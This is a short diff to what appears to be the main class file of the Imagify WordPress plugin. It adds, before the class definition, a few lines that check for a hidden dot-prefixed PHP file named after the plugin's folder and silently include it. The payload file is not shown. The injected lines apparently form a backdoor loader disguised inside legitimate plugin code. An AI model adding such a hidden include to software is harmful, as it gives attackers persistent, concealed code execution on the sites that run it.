@@ -4,6 +4,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
 /**
  * Main plugin class.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify_Plugin {
 	/**
 	 * Absolute path to the plugin (with trailing slash).
